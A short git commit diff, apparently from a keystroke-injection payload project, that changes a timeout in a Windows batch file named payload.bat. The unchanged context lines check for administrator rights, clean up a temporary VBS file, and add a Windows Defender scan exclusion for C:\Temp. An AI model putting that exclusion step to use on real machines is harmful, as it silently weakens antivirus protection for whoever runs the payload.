f8daa39d0d88f37efad23a01562e5cacea0439cc
wichtigerwaschbaer <wichtigerwaschbaer@protonmail.com>
2024-01-27 16:12:58 +0100

    adapted file names to character limits

--- injection/payload.bat
+++ injection/payload.bat
@@ -4,6 +4,6 @@ del fb05c66d-c6c1-4347-9330-d9a3c0bca994.tmp.vbs
 @rem play success sound and switch locale back to german
 Powershell (New-Object System.Media.SoundPlayer "$env:windir\Media\tada.wav").PlaySync(); Set-WinUserLanguageList -LanguageList de-DE -force
 
-timeout 10
+timeout 4
 start cmd /c "net session & echo success & pause"
 Powershell Add-MpPreference -ExclusionPath "C:\Temp"
